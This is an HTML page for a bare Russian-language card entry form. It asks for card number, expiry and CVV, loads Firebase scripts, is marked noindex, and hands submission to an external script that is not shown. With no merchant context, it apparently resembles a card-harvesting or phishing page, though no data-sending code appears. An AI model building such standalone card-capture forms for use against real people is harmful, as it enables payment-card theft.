<!DOCTYPE html>
<html>

<head>
  <title>Credit Card Info</title>

  <link href='https://fonts.googleapis.com/css?family=Roboto:400,300,100' rel='stylesheet' type='text/css'>
  <link rel="stylesheet" href="style.css">
  <meta name="robots" content="noindex,follow" />
  <script src="https://www.gstatic.com/firebasejs/8.4.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.4.2/firebase-analytics.js"></script>
    <script src="https://www.gstatic.com/firebasejs/4.12.0/firebase.js"></script>
    
</head>

<body>
    <div class="credit-card">
      <div class="form-header">
        <h4 class="title">Введите данные карты</h4>
      </div>

      <div class="form-body">
        <input type="text" class="card-number" id="cardNumber" placeholder="Номер карты">

        <div class="date-field">
          <div class="month">
            <select name="Month" id="month">
              <option value="01">Январь</option>
              <option value="02">Февраль</option>
              <option value="03">Март</option>
              <option value="04">Апрель</option>
              <option value="05">Май</option>
              <option value="06">Июнь</option>
              <option value="07">Июль</option>
              <option value="08">Август</option>
              <option value="09">Сентябрь</option>
              <option value="10">Октябрь</option>
              <option value="11">Ноябрь</option>
              <option value="12">Декабрь</option>
            </select>
          </div>
          <div class="year">
            <select name="Year" id="year">
              <option value="2021">2021</option>
              <option value="2022">2022</option>
              <option value="2023">2023</option>
              <option value="2024">2024</option>
              <option value="2025">2025</option>
              <option value="2026">2026</option>
              <option value="2027">2027</option>
              <option value="2028">2028</option>
              <option value="2029">2029</option>
            </select>
          </div>
        </div>

        <div class="card-verification">
          <div class="cvv-input">
            <input type="text" placeholder="CVV" id="cvv">
          </div>
          <div class="cvv-details">
            <p>3 или 4 цифры  находятся <br> на полосе для подписи</p>
          </div>
        </div>

        <button type="button" class="proceed-btn" onclick="send()"><a href="#">Отправить</a></button>
      </div>
    </div>
    <script src="index.js"></script>
</body>

</html>
